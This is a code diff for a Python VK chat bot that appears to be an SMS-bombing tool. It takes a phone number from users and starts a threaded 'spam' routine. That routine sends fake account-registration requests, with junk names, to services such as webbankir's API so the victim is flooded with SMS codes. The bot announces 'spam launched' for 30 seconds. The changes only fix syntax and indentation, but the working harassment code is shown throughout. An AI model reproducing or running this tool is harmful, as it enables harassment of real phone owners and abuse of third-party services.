@@ -1,5 +1,5 @@
 try:
-    import vk_api, requests, fake_useragent, threading, os
+    import vk_api, requests, fake_useragent, os, threading
     from termcolor import colored
     from vk_api.longpoll import VkLongPoll, VkEventType
     from vk_api.utils import get_random_id
@@ -156,7 +156,7 @@ try:
         try:
             a = requests.post("https://ng-api.webbankir.com/user/v2/create", headers=headers,
                               json={"lastName": "уцвцу", "firstName": "цувцу", "middleName": "цуацуа",
-                                              "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""})
+                                    "mobilePhone": phone, "email": "asadsd@mail.ru", "smsCode": ""})
             print(colored('webbankir-[+]', 'magenta'))
         except:
             print(colored('webbankir-[-]', 'magenta'))
@@ -371,7 +371,6 @@ try:
                 if reseived_message == '79283692011' and sender != admin:
                     write_message(sender, "А вот сюда нельзя :)")
                 else:
-                    
                     a = open(str(event.user_id) + "c.txt", "w")
                     a.write("1")
                     a.close()
@@ -380,20 +379,20 @@ try:
                         i = int(i)
                     write_message(sender, '💣 Спам запущен!')
                     write_message(sender, "Номер: " f'{reseived_message}' "\nВремя: 30 сек!")
-                    t = threading.Thread(target=spam, args=(reseived_message, 1, 2, 3)))
+                    t = threading.Thread(target=spam, args=(reseived_message, 1, 2, 3))
                     t.start()
                     stat1()
             elif reseived_message[0:5] == 'назад':
-                a = open(str(event.user_id) + "c.txt", "w")
-                a.write("1")
-                a.close()
-                with open(str(event.user_id) + "c.txt", "r") as ca:
-                    i = ca.read()
-                    i = int(i)
-                write_message(sender, "Выбери:")
+                    a = open(str(event.user_id) + "c.txt", "w")
+                    a.write("1")
+                    a.close()
+                    with open(str(event.user_id) + "c.txt", "r") as ca:
+                        i = ca.read()
+                        i = int(i)
+                    write_message(sender, "Выбери:")
             elif reseived_message[0:8] == "рассылка":
-                if sender == 574170405:
-                    a = 0
+                    if sender == 574170405:
+                        a = 0
                     try:
                         sm = extract_arg(event.text)
                         a = 1
@@ -423,4 +422,5 @@ try:
                     write_message(sender, "Номер введён не верно! \nПример: 79287777777")
 except:
     os.system('python bot.py')
+
     
